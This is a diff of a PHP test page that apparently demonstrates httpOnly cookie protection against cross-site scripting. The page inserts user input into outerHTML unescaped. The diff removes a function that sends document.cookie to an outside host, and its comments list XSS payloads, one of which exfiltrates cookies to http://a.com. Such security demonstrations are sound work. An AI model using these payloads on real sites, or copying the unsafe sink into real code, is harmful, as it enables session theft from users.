@@ -1,5 +1,5 @@
 <?php 
-   header("Set-Cookie: token=thisishttponlytoken; httpOnly");
+   header("Set-Cookie: token=this-is-http-only-token; httpOnly");
 ?>
 
 <!DOCTYPE html>
@@ -9,7 +9,7 @@
 </head>
 <body>
 
-	this is a test page with http only, I am writting  
+	this is a test page for http only, I am writting: 
 
 	<div id="rs"></div>
 
@@ -26,28 +26,13 @@
 			document.getElementById("rs").outerHTML = '<div id="rs">'+target.value+'</div>';
 		}
 
-		function sendToken(){
-			console.log(document.cookie);
-			var img=new Image();
-			img.src='http://a.com?token='+ document.cookie;
-			
-
-			// img.onerror=function(){
-			//  alert('error');
-			// }
-			
-			// img.onload=function(){
-			//  alert('success');
-			// }
-			
-		}
 	</script>
 
 
 <!-- 
 		XSS payload for chrome:
 		
-		<img/src=x onerror=sendToken()>
+		<img/src=x onerror="(new Image()).src = 'http://a.com?token='+ document.cookie">
 
 		<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
 
